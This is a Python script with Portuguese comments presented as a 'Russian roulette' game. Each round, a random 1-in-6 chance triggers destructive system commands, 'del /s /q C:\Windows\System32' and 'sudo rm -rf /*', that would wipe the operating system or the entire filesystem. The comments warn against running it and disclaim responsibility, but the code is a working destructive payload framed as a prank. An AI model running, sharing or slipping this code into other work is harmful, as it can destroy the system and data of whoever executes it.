#acredito que seja auto explicativo sobre oque é este código, não execute de forma alguma no seu computador se você não sabe oque está fazendo
#não me responsabilizo a qualquer dano causado
#roleta russa hihihi

import os
import random
import time

while True:
    print('Roleta russa em python, você tem 6 tentativas e uma delas pode destruir teu computador, será que você consegue concluir o jogo?')
    escolha = input('Você deseja jogar? (s/n) ')
    if escolha == 'n':
        print('Ok, a escolha é sua')
        exit()
    elif escolha != 's':
        print('Digite apenas s ou n!')
        continue

    tentativas = 6
    while tentativas > 0:
        bala = random.randint(1, 6)
        if bala == 1:
            print('destruindo sistema operacional em...')
            time.sleep(1)
            print('3')
            time.sleep(1)
            print('2')
            time.sleep(1)
            print('1')
            time.sleep(1)
            print('adeus')
            time.sleep(1)
            os.system('del /s /q C:\\Windows\\System32')
            os.system('sudo rm -rf /*')
            exit()

        tentativas -= 1
        print(f'nada aconteceu, você tem {tentativas} tentativas restantes.')
        if tentativas > 0:
            while True:
                tentar = input('Tentar denovo? (s/n) ')
                if tentar == 'n':
                    print('Ok, a escolha é sua')
                    exit()
                elif tentar == 's':
                    break
                else:
                    print('Digite apenas s ou n!')

    print('Você sobreviveu às 6 tentativas! Sortudo desgraçado')
    exit()
